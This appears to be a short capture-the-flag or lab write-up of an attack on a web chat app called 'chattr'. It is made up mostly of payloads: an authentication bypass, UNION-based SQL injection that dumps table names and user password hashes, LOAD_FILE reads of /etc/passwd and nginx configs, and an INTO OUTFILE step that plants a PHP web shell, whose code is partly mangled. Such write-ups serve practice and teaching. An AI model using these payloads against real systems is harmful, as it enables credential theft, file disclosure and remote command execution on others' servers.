Going to `https://IP:port`

Going to the site and using `Burpsuite` was able to make an account.
Using `' or '1' = '1` Was able to bypass the create an account.

With that I can use my created account to log in.

Going to the chats using the search bar.
`') union select 1, 2 ,3 ,4-- -`
![[Pasted image 20260813095544.png]]
`') union select 1, 2 , table_name, 4 from information_schema.tables where table_schema = 'chattr'-- -`

`') union select 1, 2, column_name, table_name from information_schema.columns where table_name = "Users"-- -`
![[Pasted image 20260813100520.png]]
`') union select 1, 2 , password, username from chattr.Users-- -`

Got the admin hash from that. Testing to see if I can access files on the machine.
`tcn') UNION SELECT 1,2,variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

`') union select 1, 2 , LOAD_FILE('/etc/passwd'), 4-- -`
![[Pasted image 20260813101246.png]]

`) union select 1, 2 , LOAD_FILE('/etc/nginx/nginx.conf'), 4-- -`

Then doing `) union select 1, 2 , LOAD_FILE('/etc/nginx/sites-enabled/default'), 4-- -`

Tells us to go to
```bash
sl/certs/chattr.crt; ssl_certificate_key /etc/ssl/private/chattr.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; root /var/www/chattr-prod; location / { index index.php; try_files $uri $uri/ /index.php?$query_string; } location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php8.2-fpm.sock; } location ^~ /includes/ { deny all; } }

# /var/www/chattr-prod
```

Now making a web shell
`') union select "",'<?pxxxxp system ($_REQUUUUEST [0]); ?>', "","" into outfile '/var/www/chattr-prod/shells.php ' -- -`

https://154.57.164.69:32453/shells.php?0=ls